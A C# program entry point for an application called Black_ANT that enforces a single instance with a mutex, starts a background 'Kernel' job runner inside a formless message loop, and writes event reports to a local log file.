using System;
using System.Windows.Forms;
using Security;
using ComponentAssembly;
using System.Threading.Tasks;
using System.Threading;


namespace Black_ANT
{
    static class Program
    {
        [ThreadStatic]
        public static Kernel BlackANT_Kernel;

        private static Object _LockObj = new object();

        [STAThread]
        public static void Main(string[] args)
        {
            // Add DLL reference from Resources...
            ComponentController.Initialize();

            //
            if (NativeMethods.mutex.WaitOne(TimeSpan.Zero, true)) // Run Application
            {
                //
                // Run Kernel Now...
                Kernel.ReportOccurrence += BlackANT_Kernel_ReportOccurrence;
                BlackANT_Kernel = new Kernel();

                //if (!BlackANT_Kernel.SetRunningPath())
                //    return;

                BlackANT_Kernel.RunJubs();
                //
                // Begins running a standard application message loop on the current thread, without a form.
                Application.Run();
                //
                //
                //
                NativeMethods.mutex.ReleaseMutex();
            }
            else
            {
                NativeMethods.PostMessage((IntPtr)NativeMethods.HWND_BROADCAST, NativeMethods.WM_SHOWME, IntPtr.Zero, IntPtr.Zero);

                MessageBox.Show(Application.ProductName + " is Running already!");
            }
        }

        private static void BlackANT_Kernel_ReportOccurrence(object sender, EventArguments.ReportEventArgs e)
        {
            string logPath = System.IO.Path.Combine(Application.StartupPath, Application.ProductName + ".log");

            string printData = string.Format("{1} [{2}]: \t {3}{4}  ===>  {5} {0}{6}{0}",
                    Environment.NewLine,
                    e.OccurrenceTime_IST.ToLongDateString(),
                    e.OccurrenceTime_IST.ToLongTimeString(),
                    e.Source,
                    e.ReportCode == EventArguments.ReportCodes.ExceptionHandled ? " (#EXP#)" : "",
                    e.Message,
                    e.Source == "Kernel" ?
                        "======================================================================" :
                        "-----------------------------------------------------------");


            if (System.IO.File.Exists(logPath)) // Append new report to log files
            {
                lock (_LockObj) { System.IO.File.AppendAllText(logPath, printData); }
            }
            else // Create new log file and save report
            {
                lock (_LockObj) { System.IO.File.WriteAllText(logPath, printData); }
            }
        }
    }
}
